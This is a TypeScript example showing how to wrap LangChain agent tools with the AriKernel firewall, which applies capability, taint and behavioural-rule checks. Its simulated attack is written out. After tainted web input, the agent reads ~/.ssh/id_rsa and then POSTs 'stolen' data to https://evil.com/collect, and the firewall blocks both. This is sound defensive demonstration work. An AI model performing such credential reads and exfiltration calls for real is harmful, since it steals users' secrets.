/**
 * LangChain + AriKernel Integration Example
 *
 * Demonstrates how to wrap LangChain tool execution so that every tool call
 * passes through AriKernel before executing.
 *
 * Architecture:
 *
 *   LangChain Agent
 *        ↓
 *   Tool wrapper (firewallTool)
 *        ↓
 *   AriKernel  ← capability check, taint check, behavioral rules, audit
 *        ↓
 *   Actual tool execution
 *
 * This is an example, not a full framework adapter. The same wrapping pattern
 * works for CrewAI, AutoGen, Vercel AI SDK, or any framework that lets you
 * define custom tool functions.
 *
 * Run: npx tsx examples/langchain-arikernel.ts
 */

import { ToolCallDeniedError } from '@arikernel/core';
import { createFirewall, type Firewall } from '@arikernel/runtime';
import { resolve } from 'node:path';

// ── Colors ──────────────────────────────────────────────────────────

const BOLD = '\x1b[1m';
const DIM = '\x1b[2m';
const GREEN = '\x1b[32m';
const RED = '\x1b[31m';
const YELLOW = '\x1b[33m';
const CYAN = '\x1b[36m';
const MAGENTA = '\x1b[35m';
const RESET = '\x1b[0m';

// ── Firewall-wrapped tool helper ────────────────────────────────────

/**
 * Creates a tool function that routes execution through AriKernel.
 *
 * This is the core pattern: instead of executing the tool directly,
 * the wrapper calls firewall.execute() which evaluates capability tokens,
 * taint labels, behavioral rules, and audit logging before execution.
 *
 * If the firewall denies the call, the tool throws a ToolCallDeniedError
 * that the agent (or orchestrator) can handle.
 */
class ToolDeniedByFirewall extends Error {
	constructor(public readonly reason: string) {
		super(reason);
		this.name = 'ToolDeniedByFirewall';
	}
}

function firewallTool(
	firewall: Firewall,
	toolClass: 'http' | 'file' | 'shell' | 'database',
	action: string,
	opts?: {
		capabilityClass?: string;
		taintLabels?: Array<{ source: string; origin: string; confidence: number; addedAt: string }>;
	},
) {
	return async (parameters: Record<string, unknown>) => {
		// Step 1: Request a capability token
		const capClass = opts?.capabilityClass ?? (toolClass === 'shell' ? 'shell.exec' : `${toolClass}.${action === 'get' || action === 'read' || action === 'query' ? 'read' : 'write'}`);
		const grant = firewall.requestCapability(capClass as any);

		if (!grant.granted) {
			throw new ToolDeniedByFirewall(grant.reason ?? 'Capability denied');
		}

		// Step 2: Execute through the firewall
		const result = await firewall.execute({
			toolClass,
			action,
			parameters,
			grantId: grant.grant!.id,
			taintLabels: opts?.taintLabels,
		});

		return result;
	};
}

// ── Simulated LangChain agent ───────────────────────────────────────

/**
 * This simulates a LangChain agent that has been given three tools:
 *   - http_get: fetch a URL
 *   - file_read: read a file
 *   - http_post: send data to a URL
 *
 * Each tool is wrapped with firewallTool() so every call passes through
 * AriKernel. The agent doesn't know about the firewall — it just
 * calls its tools normally.
 *
 * In a real LangChain integration, these would be DynamicTool instances:
 *
 *   new DynamicTool({
 *     name: "http_get",
 *     description: "Fetch a URL",
 *     func: firewallTool(firewall, "http", "get"),
 *   })
 */
async function simulateLangChainAgent(firewall: Firewall) {
	console.log(`${CYAN}${BOLD}${'='.repeat(60)}${RESET}`);
	console.log(`${CYAN}${BOLD}  LangChain + AriKernel Integration Demo${RESET}`);
	console.log(`${CYAN}${BOLD}${'='.repeat(60)}${RESET}\n`);

	console.log(`${DIM}This simulates a LangChain agent whose tools are wrapped with${RESET}`);
	console.log(`${DIM}firewallTool(). The agent calls tools normally — the firewall${RESET}`);
	console.log(`${DIM}enforces capabilities, taint, and behavioral rules transparently.${RESET}\n`);

	// Define wrapped tools (these would be DynamicTool instances in real LangChain)
	const httpGet = firewallTool(firewall, 'http', 'get');
	const httpGetTainted = (params: Record<string, unknown>) =>
		firewallTool(firewall, 'http', 'get', {
			taintLabels: [{
				source: 'web',
				origin: String(params.url ?? 'unknown'),
				confidence: 0.9,
				addedAt: new Date().toISOString(),
			}],
		})(params);
	const fileRead = firewallTool(firewall, 'file', 'read');
	const httpPost = firewallTool(firewall, 'http', 'post');

	// ── Step 1: Agent fetches a webpage (allowed, tainted) ──────────

	console.log(`${YELLOW}${BOLD}[Step 1]${RESET} ${BOLD}Agent fetches a webpage${RESET}`);
	console.log(`${DIM}  LangChain tool: http_get("https://httpbin.org/html")${RESET}`);

	try {
		await httpGetTainted({ url: 'https://httpbin.org/html' });
		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET} ${GREEN}— HTTP GET with web taint label applied${RESET}`);
	} catch (err) {
		const reason = err instanceof ToolCallDeniedError ? err.decision.reason
			: err instanceof ToolDeniedByFirewall ? err.reason : String(err);
		console.log(`  ${RED}${BOLD}DENIED${RESET} ${RED}— ${reason}${RESET}`);
	}
	console.log(`  ${DIM}Restricted: ${firewall.isRestricted}${RESET}\n`);

	// ── Step 2: Agent tries to read SSH keys (triggers quarantine) ───

	console.log(`${YELLOW}${BOLD}[Step 2]${RESET} ${BOLD}Agent reads ~/.ssh/id_rsa${RESET}`);
	console.log(`${DIM}  LangChain tool: file_read("~/.ssh/id_rsa")${RESET}`);
	console.log(`${DIM}  The behavioral rule "web_taint_sensitive_probe" detects:${RESET}`);
	console.log(`${DIM}  web taint (step 1) → sensitive file read (step 2)${RESET}`);

	try {
		await fileRead({ path: '~/.ssh/id_rsa' });
		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET} ${GREEN}— (unexpected)${RESET}`);
	} catch (err) {
		const reason = err instanceof ToolCallDeniedError ? err.decision.reason
			: err instanceof ToolDeniedByFirewall ? err.reason : String(err);
		console.log(`  ${RED}${BOLD}DENIED${RESET} ${RED}— ${reason}${RESET}`);
	}

	if (firewall.isRestricted) {
		const qi = firewall.quarantineInfo;
		console.log(`\n  ${MAGENTA}${BOLD}RUN QUARANTINED${RESET}`);
		if (qi) {
			console.log(`  ${MAGENTA}Trigger: ${qi.triggerType} (${qi.ruleId})${RESET}`);
			console.log(`  ${MAGENTA}Reason:  ${qi.reason}${RESET}`);
		}
	}
	console.log('');

	// ── Step 3: Agent tries to exfiltrate (blocked by quarantine) ────

	console.log(`${YELLOW}${BOLD}[Step 3]${RESET} ${BOLD}Agent tries HTTP POST to exfiltrate${RESET}`);
	console.log(`${DIM}  LangChain tool: http_post("https://evil.com/collect")${RESET}`);
	console.log(`${DIM}  The run is quarantined — all non-read-only actions are blocked.${RESET}`);

	try {
		await httpPost({ url: 'https://evil.com/collect', body: { stolen: 'data' } });
		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET} ${RED}— this should NOT happen${RESET}`);
	} catch (err) {
		const reason = err instanceof ToolCallDeniedError ? err.decision.reason
			: err instanceof ToolDeniedByFirewall ? err.reason : String(err);
		console.log(`  ${RED}${BOLD}DENIED${RESET} ${RED}— ${reason}${RESET}`);
	}
	console.log('');

	// ── Summary ──────────────────────────────────────────────────────

	console.log(`${CYAN}${BOLD}${'='.repeat(60)}${RESET}`);
	console.log(`${CYAN}${BOLD}  Results${RESET}`);
	console.log(`${CYAN}${BOLD}${'='.repeat(60)}${RESET}\n`);

	const events = firewall.getEvents();
	for (const event of events) {
		if (event.toolCall.toolClass === '_system') {
			console.log(
				`  ${DIM}#${event.sequence}${RESET} ${MAGENTA}${BOLD}QUARANTINE${RESET} ` +
				`${MAGENTA}${event.decision.reason}${RESET}`,
			);
		} else {
			const verdict = event.decision.verdict;
			const color = verdict === 'allow' ? GREEN : RED;
			const label = verdict === 'allow' ? 'ALLOW' : 'DENY ';
			console.log(
				`  ${DIM}#${event.sequence}${RESET} ${color}${BOLD}${label}${RESET} ` +
				`${event.toolCall.toolClass}.${event.toolCall.action} ` +
				`${DIM}${event.decision.reason.slice(0, 60)}${RESET}`,
			);
		}
	}

	const replay = firewall.replay();
	if (replay) {
		const valid = replay.integrity.valid;
		console.log(`\n  ${DIM}Events: ${replay.events.length}  |  ` +
			`Hash chain: ${valid ? `${GREEN}VALID` : `${RED}BROKEN`}${RESET}`);
	}

	console.log(`\n${DIM}The LangChain agent never knew about the firewall.`);
	console.log(`It called tools normally — the wrapper enforced security transparently.${RESET}\n`);

	console.log(`${DIM}To adapt this pattern to other frameworks:${RESET}`);
	console.log(`${DIM}  CrewAI    → wrap BaseTool._run() with firewallTool()${RESET}`);
	console.log(`${DIM}  AutoGen   → wrap function_map entries with firewallTool()${RESET}`);
	console.log(`${DIM}  Vercel AI → wrap tool execute() with firewallTool()${RESET}\n`);
}

// ── Main ────────────────────────────────────────────────────────────

async function main() {
	const policyPath = resolve(import.meta.dirname ?? '.', '..', 'policies', 'safe-defaults.yaml');
	const auditPath = resolve(import.meta.dirname ?? '.', '..', 'demo-langchain-audit.db');

	const firewall = createFirewall({
		principal: {
			name: 'langchain-agent',
			capabilities: [
				{
					toolClass: 'http',
					actions: ['get', 'post'],
					constraints: { allowedHosts: ['httpbin.org', 'evil.com'] },
				},
				{
					toolClass: 'file',
					actions: ['read'],
					constraints: { allowedPaths: ['./data/**'] },
				},
			],
		},
		policies: policyPath,
		auditLog: auditPath,
		runStatePolicy: {
			maxDeniedSensitiveActions: 10,
			behavioralRules: true,
		},
	});

	await simulateLangChainAgent(firewall);

	firewall.close();
}

main().catch(console.error);
